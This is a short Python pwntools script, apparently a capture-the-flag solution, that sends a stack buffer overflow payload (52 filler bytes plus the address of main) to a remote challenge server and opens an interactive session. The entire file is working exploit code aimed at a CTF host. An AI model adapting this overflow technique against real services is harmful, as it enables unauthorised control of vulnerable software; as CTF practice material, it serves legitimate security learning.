from pwn import *

# p = process('./leet')
p = remote('0.cloud.chals.io', 26008)
e = ELF('./leet')

payload = b'A' * 52
payload += p32(e.symbols['main'])

p.sendline(payload)
p.interactive()
